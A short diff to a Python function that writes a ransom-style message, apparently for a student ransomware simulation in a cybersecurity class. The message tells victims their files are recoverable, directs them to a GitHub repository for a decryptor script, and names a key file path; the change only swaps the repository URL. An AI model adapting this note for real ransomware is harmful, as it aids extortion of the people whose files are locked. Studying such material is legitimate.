@@ -56,7 +56,7 @@ def nota():
         "This is an academic project for the Cybersecurity class.\n\n"
         "HOW TO RECOVER YOUR FILES:\n"
         "1. Don't panic. Nothing has been erased.\n"
-        "2. Go to my GitHub: https://github.com/tu_usuario/booshdag-io\n"
+        "2. Go to my GitHub: https://github.com/Booshdag-io/FRG_SOCIETY\n"
         "3. Download the script 'decryptor.py'.\n"
         "4. Run it to restore everything to normal.\n\n"
         " Your security key is in: C:\\root_audit.key\n"
